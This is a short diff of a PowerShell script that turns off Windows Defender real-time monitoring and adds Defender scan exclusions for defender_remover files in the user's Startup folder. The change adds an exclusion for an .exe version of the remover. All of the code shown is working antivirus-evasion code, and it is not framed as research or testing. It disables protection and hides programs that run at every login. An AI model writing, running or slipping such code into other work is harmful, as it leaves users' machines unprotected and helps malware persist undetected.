@@ -17,6 +17,7 @@ $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Sta
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true
     Add-MpPreference -ExclusionPath "$startupPath\defender_remover.ps1"
+    Add-MpPreference -ExclusionPath "$startupPath\defender_remover.exe"
     #Add-MpPreference -ExclusionProcess "yourtool.exe"
 
     Write-Host "Defender Real-Time Protection is now disabled." -ForegroundColor Green
